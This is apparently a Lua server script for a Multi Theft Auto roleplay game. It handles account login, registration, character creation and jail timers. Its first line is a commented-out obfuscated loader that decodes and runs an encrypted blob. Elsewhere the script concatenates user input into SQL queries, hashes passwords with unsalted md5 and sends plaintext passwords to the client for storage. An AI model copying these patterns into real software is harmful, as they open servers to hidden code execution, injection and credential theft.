--pcall(loadstring(base64Decode(teaDecode( "+d5MCqURlYMxDPOmKBsah3ytp15FTYvc7bTUJ9C8V/a4EITuih4wEWMg95mrdPUqwXCo0eLPLd/R7hnuSkBwyIu0Wn5o8hGWCC2k4Id1E/iR8cxnraTQak6MvE+GvaeTW0jUVj3OPgoRcwyoMuNzTneKSzoLSU4KgniyJ2ZEiTMagfqfCKfXX59FCczORHvAPxROYzIjaJoxDCnjYAIF385BYIp3cG6UxQHWlS8CLMBR6XfDO31xuMXujGpPM1Qxvevw5GcshxVwC14v190J+CCiXzLPutF+BSyiCTQ/6LuOpNim9+5ppSzkfy9IG66w1lfwG1EL6oO8V74ZAStf1ZB9IHrWzb75wRaiJ/4OpvlR6Kzr23CkIoq7/i25icPtMMnJzdo3lyGMdMMO0fg554SW9J3iDEmbLFdGfTd2CZW4IQ+WxjflctmyiXOu6VtZfihyavVpdl09ew694tVFQMHfgvMFA3Qm","lssdf[????sdf")))) --MYSQL lag ellen valami geci

local connection = exports["san_mysql"]:getConnection()



function onLoginClick(player, username, password2)
	
	if isTimer(timer) then 
	exports.san_infobox:addNotification(player,"Estamos com uma quantidade grande de pessoas tentando logar ao mesmo tempo, tenha paciência","error")	
	return 
	end
	timer = setTimer(function() end, 1500, 1)

	local password = md5(password2)
	local loginQuery = dbPoll(dbQuery(connection, "SELECT * FROM accounts WHERE username = ? AND password = ? LIMIT 1", username, password), -1)
	if (tonumber(#loginQuery) or 0) > 0 then
		for _, row in ipairs(loginQuery) do
				if row["online"] == 1 then
					exports.san_infobox:addNotification(player,"In Nam Karbari Ghablan Entekhab Shode!","error")
					return
				end
				local accId = tonumber(row["id"])
				setElementData(player, "acc:id", accId)
				setElementData(player, "acc:name", tostring(row["username"]))
				setElementData(player, "acc:admin", tonumber(row["admin"]) or 0)
				--setElementData(player, "acc:guard", tonumber(row["guard"]) or 0)
				setElementData(player, "acc:aseged", tonumber(row["aseged"]) or 0)
				--setElementData(player, "acc:regdate", row["regdate"])
				setElementData(player, "acc:lastlogin", row["lastlogin"])
				dbExec(connection, "UPDATE accounts SET online = '1' WHERE id = ?", accId)
				dbExec(connection, "UPDATE accounts SET mtaserial = ? WHERE id = ?", getPlayerSerial(player), row["id"])

				--logIn(player, username, password2)
		end
		exports.a_infobox:addBox(player,"success","وارد بازی شدی")
		triggerClientEvent(player,"saveLoginToXML",player, tostring(username))
		triggerClientEvent(player,"saveLoginToXML2",player, tostring(password2))
		checkCharacter(player)
		local account = getAccount ( username, password2 )
		if ( account ~= false ) then 
			logIn (player, account, password2 ) 
		else
			addAccount(tostring(username),tostring(password2))
			outputServerLog ( "Servidor: Conta: "..username.." criada com sucesso" )
			redirectPlayer(player,"",0)
		end
	else
		exports.san_infobox:addNotification(player,"Nome de usuário ou senha incorretos!","error")
	end
end
addEvent("onLoginClick", true)
addEventHandler("onLoginClick", root, onLoginClick)



local serials = {
 ["970CD3F7B16A81312BF86EEC0EB72DE4"]=true,
 --["970CD3F7B16A81312BF86EEC0EB72DE4"]=true,	
}

function onRegisterClick(player, username, password2) --, email)
	
	if isTimer(timer2) then 
	exports.san_infobox:addNotification(player,"Estamos com uma quantidade grande de pessoas tentando registrar ao mesmo tempo, tenha paciência","error")	
	return 
	end
	timer2 = setTimer(function() end, 3000, 1)
	local password = md5(password2)
	local registerQuery = dbPoll(dbQuery(connection, "SELECT * FROM accounts WHERE username LIKE '".. tostring(username) .."' or mtaserial = '".. getPlayerSerial(player) .."'"), -1)
	local accountAdded = addAccount(tostring(username),tostring(password2))
	if ( accountAdded ) then
		outputChatBox ( "Ba Tashakor Az Sabte Name Shoma " .. getPlayerName(player) .. "", player )

	for _, row in ipairs(registerQuery) do
		if row["username"] == username then
			exports.san_infobox:addNotification(player,"Name Karbari Mashghol Ast!","error")
			return
		end
		if row["mtaserial"] == getPlayerSerial(player) and not serials[getPlayerSerial(player)] then
			exports.san_infobox:addNotification(player,"Nmitoni Chand Account Dashte Bashi!","error")
			return
		end
	end
	local registerInsert = dbQuery(connection, "INSERT INTO accounts SET username = ?, password = ?, mtaserial = ?, ip = ?, regdate = NOW(), lastlogin = NOW()", username, password, getPlayerSerial(player), getPlayerIP(player))
	local result, num, insertID = dbPoll(registerInsert, -1)
	if insertID then
		exports.san_infobox:addNotification(player,"Sabte Nam Kardi, Hala Mitoni Vared Beshi!","success")


		setElementData(player, "acc:id", insertID)
		triggerClientEvent(player, "login:setPlayerPanelState", player, "login")
	end

		else
			exports.san_infobox:addNotification(player,"In account Az Ghabl Vojod Darad!","error")
			outputChatBox ( "In account Az Ghabl Vojod Darad!", player )
			return
		end

end
addEvent("onRegisterClick", true)
addEventHandler("onRegisterClick", root, onRegisterClick)


function onCharCreateClick(player, charName, charDesc, charBirth, charHeight, charGender, charSkin)
	
	if isTimer(timer3) then 
		exports.san_infobox:addNotification(player,"Estamos com uma quantidade grande de pessoas tentando logar ao mesmo tempo, tenha paciência","error")	
		return 
		end
		timer3 = setTimer(function() end, 3000, 1)

	local charId = getElementData(player, "acc:id")

	local charQuery = dbPoll(dbQuery(connection, "SELECT * FROM characters where charname LIKE '".. charName .."' limit 1"), -1)

	for _, row in ipairs(charQuery) do

		if string.lower(charName) == string.lower(row["charname"]) then
			exports.san_infobox:addNotification(player,"In Esme Dar Shahr Vojod Darad!","error")
			return
		end
	end

	local x, y, z = 1152.0964355469,-1756.3059082031,13.636505126953 --1149.8869628906, -1754.1486816406, 13.615719795227
	local pos = toJSON({x, y, z, 0, 0})
	local charInsert = dbExec(connection, "INSERT INTO characters SET id = ?, charname = ?, gender = ?, skin = ?, pos = ?, suly = 80, magassag = ?, eletkor = ?, leiras = ?, account = ?", charId, charName, charGender, charSkin, pos, charHeight, charBirth, charDesc, getElementData(player, "acc:id"))



	if charInsert then
		exports.san_infobox:addNotification(player,"Karekter Ba Moafaghiyat Sabt Shod!","success")
		checkCharacter(player)
	end
end
addEvent("onCharCreateClick", true)
addEventHandler("onCharCreateClick", root, onCharCreateClick)



function checkCharacter(player)
	local accId = getElementData(player, "acc:id")
	local spawnQuery = dbPoll(dbQuery(connection, "SELECT * FROM characters WHERE id = ?", accId), -1)
	if (#spawnQuery > 0) then
		for _, cRow in ipairs(spawnQuery) do
			setElementData(player, "char:id", accId)
			--dbExec(connection, "UPDATE characters SET mtaserial = ? WHERE id = ?", getPlayerSerial(player), accId)
			setElementData(player, "playerid", accId)
			charname = tostring(cRow["charname"])
			playedTime = cRow["playedTime"]
			onlineTime = cRow["onlineTime"]
			farhan = cRow["farhan"]
			--playedTime = cRow["playedTime"]
			money = tonumber(cRow["money"])
			rank = (cRow["rank"])
			bankmoney = tonumber(cRow["bankmoney"])
			
			skin = cRow["skin"]
			adminduty = cRow["adminduty"]
			anick = tostring(cRow["anick"])
			pp = cRow["premiumpont"]
			Leiras = cRow["leiras"]
			job = tostring(cRow["job"])
			pos = fromJSON(cRow["pos"])
			level = tonumber(cRow["Level"])
			exp = tonumber(cRow["LevelEXP"])
			setElementData(player, "spawnPos", pos)
			vehSlot = cRow["carSlot"]
			houseSlot = cRow["houseSlot"]
			hp = cRow["hp"]
			armor = cRow["armor"]
			hunger = cRow["hunger"]
			drink = cRow["drink"]
			adutyTime = cRow["adutyTime"]
			dutySkin = cRow["dutySkin"]
			numberphone1 = cRow["numberphone"]


			adminjail = tonumber(cRow["adminjail"])
			adminjail_reason = cRow["adminjail_reason"]
			adminjail_idoTelik = tonumber(cRow["adminjail_idoTelik"])
			adminjail_alapIdo = tonumber(cRow["adminjail_alapIdo"])
			adminjail_admin = cRow["adminjail_admin"]
			adminjail_adminSerial = cRow["adminjail_adminSerial"]
						
			jailed = tonumber(cRow["jailed"]) or 0
			jailed_reason = cRow["jailed_reason"] or false
			jailed_idoTelik = tonumber(cRow["jailed_idoTelik"]) or 0
			jailed_alapIdo = tonumber(cRow["jailed_alapIdo"]) or 0
			jailed_player = cRow["jailed_player"] or false

			setElementData(player, "jailed", jailed)
			setElementData(player, "jailed:reason", jailed_reason)
			setElementData(player, "jailed:ido", jailed_alapIdo)
			setElementData(player, "jailed:idoTelik", jailed_idoTelik)
			local idoLetelt1 = jailed_alapIdo-jailed_alapIdo
			setElementData(player, "jailed:idoLetelt", idoLetelt1)
			setElementData(player, "jailed:player", jailed_player)
				
			setElementData(player, "char:numberphone", numberphone1)
			setElementData(player, "adminjail", adminjail)
			setElementData(player, "adminjail:reason", adminjail_reason)
			setElementData(player, "adminjail:ido", adminjail_idoTelik)
			setElementData(player, "idoTelik", adminjail_idoTelik)
			local idoLetelt = adminjail_alapIdo-adminjail_alapIdo
			setElementData(player, "idoLetelt", idoLetelt)
			setElementData(player, "adminjail:admin", adminjail_admin)
			setElementData(player, "adminjail:adminSerial", adminjail_adminSerial)
			setElementData(player, "adminjail:alapIdo", adminjail_alapIdo)
				
			checkAdminjail(player)
			checkPdJail(player)

			
			setElementData(player, "spawnedHp", hp)
			setElementData(player, "spawnedArmor", armor)
			setElementData(player, "spawnedHunger", hunger)
			setElementData(player, "spawnedDrink", drink)
			setElementData(player, "char:name", charname)
			setElementData(player, "char:playedTime", playedTime)
			setElementData(player, "char:onlineTime", onlineTime)
			setElementData(player, "char:farhan", farhan)
			
			setElementData(player, "char:money", money)
			setElementData(player, "char:rank", rank)
			setElementData(player, "char:bankmoney", bankmoney)
			setElementData(player,"char:skin", skin)
			setElementData(player, "char:adminduty", 0)
			setElementData(player, "char:anick", anick)
			setElementData(player, "char:pp", pp)
			setElementData(player, "job", job)
			exports.san_employment:setPlayerJob(player, job,  job, skin,true)
 			setElementData (player, "Sys:Level",level)
			setElementData (player, "LSys:EXP",exp)
			setElementData(player, "char:leiras", Leiras)
			setElementData(player, "aduty:time", adutyTime)
			setElementData(player, "char:dutySkin", dutySkin)
			setElementData(player, "char:vehSlot", vehSlot)
			setElementData(player, "char:houseSlot", houseSlot)
			setPlayerHudComponentVisible(player, "crosshair", true)
			local numerotelefone = getElementData(player, "char:numberphone")
			local telefone = getElementData(player,"char:telefone")
		
			if (tonumber(numerotelefone) or 0) > 0 and (tonumber(numerotelefone) or 0) then
			setElementData(player,"char:telefone", numerotelefone)
			--print(""..getPlayerName(player).." Ja tem um numero de telefone")
			else
			--print(""..getPlayerName(player).." Acaba de gerar um numero de telefone")
			setElementData(player,"char:numberphone", math.random(1111111,9999999))
			end


			textureString = cRow["cj"]

			modelString = cRow["cjm"]
			textures = {}
			models = {}
			local textures = split(textureString, 44)
			local models = split(modelString, 44)
			setElementModel(source,0)
			for i=0, 17, 1 do
			if ( textures[i+1] ~= " " ) then
				addPedClothes(player, textures[i+1], models[i+1], i)
			end
			end
			textures = {}
			models = {}
			setElementData(player,"lebas1",textureString)
			setElementData(player,"lebas2",modelString)
			triggerClientEvent(player, "checkPlayerCharacter", player, "charSpawn")
			
		end
	else
		triggerClientEvent(player, "checkPlayerCharacter", player, "charCreate")
	end

 end
addEvent("checkCharacter", true)
addEventHandler("checkCharacter", root, checkCharacter)





function checkAdminjail(player)
	if getElementData(player, "adminjail") == 1 then
		local idoTelikTimer = setTimer(idoTelikLe, 60000, getElementData(player, "idoTelik"), player)
		local theTimer = setElementData(player, "adminjail:theTimerAccounts", idoTelikTimer)			
		outputChatBox("#dc143c[Admin-Jail]:#ffffffShoma Jail Shodid,Baraye Didane Dalil Az CMD #7cc576/tempo Estefade #ffffffKonid", player, 255, 255, 255, true)		
	end
end

function checkPdJail(player)
	if getElementData(player, "jailed") == 1 then
		local idoTelikTimer = setTimer(idoTelikLePd, 60000, getElementData(player, "jailed:idoTelik"), player)
		local theTimer = setElementData(player, "jailed:timerAccounts", idoTelikTimer)			
		outputChatBox("#0094ff[Zendan]:#ffffff Shoma Baz Dasht Shodid,Baraye Didane Dalil Az CMD #7cc576/tempo Estefade #ffffffKonid", player, 255, 255, 255, true)		
	end
end


function idoTelikLe(targetPlayer)
	if isElement(targetPlayer) then
		local idoTelik = tonumber(getElementData(targetPlayer, "idoTelik")) or 0
		local idoLetelt = tonumber(getElementData(targetPlayer, "idoLetelt")) or 0
		if (idoTelik) and (idoLetelt) then
			setElementData(targetPlayer, "idoTelik", idoTelik-1)
			setElementData(targetPlayer, "idoLetelt", idoLetelt+1)
			local sql = dbExec(connection, "UPDATE characters SET adminjail_idoTelik = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", idoTelik)
		end
		if (idoTelik) <= 1 then
			outputChatBox("#0094ff[informação]: #ffffffSua sentença expirou.", targetPlayer, 255, 255, 255, true)
			local theTimer = getElementData(targetPlayer, "adminjail:theTimerAccounts")
			if isTimer(theTimer) then
				killTimer(theTimer)
  			end
			setElementData(targetPlayer, "adminjail:theTimerAccounts", false)
			local adminjailed = setElementData(targetPlayer, "adminjail", false)
			local adminjail_reason = setElementData(targetPlayer, "adminjail:reason", false)
			local alapido = setElementData(targetPlayer, "adminjail:ido", false)
			local admin = setElementData(targetPlayer, "adminjail:admin", false)
			local adminSerial = setElementData(targetPlayer, "adminjail:adminSerial", false)
			
			--sql
			local sql = dbExec(connection, "UPDATE characters SET adminjail = ?, adminjail_reason = ?, adminjail_idoTelik = ?, adminjail_alapIdo = ?, adminjail_admin = ?, adminjail_adminSerial = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", 0, false, false, false, false, false)
			local idoTelikVege = setElementData(targetPlayer, "idoTelik", false)
			local idoLeteltVege = setElementData(targetPlayer, "idoLetelt", false)
			
			--pos
			setElementPosition(targetPlayer, 1580.0419921875, -1682.6710205078, 14.996187210083)
			--local setInterior = setElementInterior(targetPlayer, 0)
			--local setDimension = setElementDimension(targetPlayer, 0)
		end
	end
end

function idoTelikLePd(targetPlayer)
	if (isElement(targetPlayer)) then
		
		local idoTelik = tonumber(getElementData(targetPlayer, "jailed:idoTelik")) or 0
		local idoLetelt = tonumber(getElementData(targetPlayer, "jailed:idoLetelt")) or 0
		
		if (idoTelik) and (idoLetelt) then
			setElementData(targetPlayer, "jailed:idoTelik", getElementData(targetPlayer, "jailed:idoTelik")-1 or 0)
			setElementData(targetPlayer, "jailed:idoLetelt", getElementData(targetPlayer, "jailed:idoLetelt")+1 or 0)
			--outputChatBox(idoTelik .. " van hátra | " ..  idoLetelt .. " letelt | " .. getPlayerName(targetPlayer) .. " [ACC]")
			local sql = dbExec(connection, "UPDATE characters SET jailed_idoTelik = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", idoTelik)
		end
		
		if (idoTelik) <= 1 then
			
			outputChatBox("#0094ff[Mojazat]:#ffffff Modat Jail Shoma Tamom Shod.", targetPlayer, 255, 255, 255, true)
			
			--outputAdminMessage(getPlayerName(targetPlayer):gsub("_"," ") .. " adminjailje lejárt. [CHECK:ACC]") --IDG, eltávolítható
		
			local theTimer = getElementData(targetPlayer, "jailed:timerAccounts")
			if isTimer(theTimer) then
				killTimer(theTimer)
			end
			
			setElementData(targetPlayer, "jailed:timerAccounts", false)
			
			local adminjailed = setElementData(targetPlayer, "jailed", false)
			local adminjail_reason = setElementData(targetPlayer, "jailed:reason", false)
			local alapido = setElementData(targetPlayer, "jailed:ido", false)
			local admin = setElementData(targetPlayer, "jailed:player", false)
			
			--sql
			local sql = dbExec(connection, "UPDATE characters SET jailed = ?, jailed_reason = ?, jailed_idoTelik = ?, jailed_alapIdo = ?, jailed_player = ? WHERE id = '" .. getElementData(targetPlayer, "char:id") .. "'", 0, false, false, false, false, false)
			local idoTelikVege = setElementData(targetPlayer, "jailed:idoTelik", false)
			local idoLeteltVege = setElementData(targetPlayer, "jailed:idoLetelt", false)
			
			--pos
			local setPosition = setElementPosition(targetPlayer, 1580.0419921875, -1682.6710205078, 14.996187210083)
			local setInterior = setElementInterior(targetPlayer, 0)
			local setDimension = setElementDimension(targetPlayer, 0)
		end
	end
end












function getClothes (thePlayer)
    for i=0,17 do      
        removePedClothes (thePlayer, i )          
    end
end
addCommandHandler ( "resetcj", getClothes )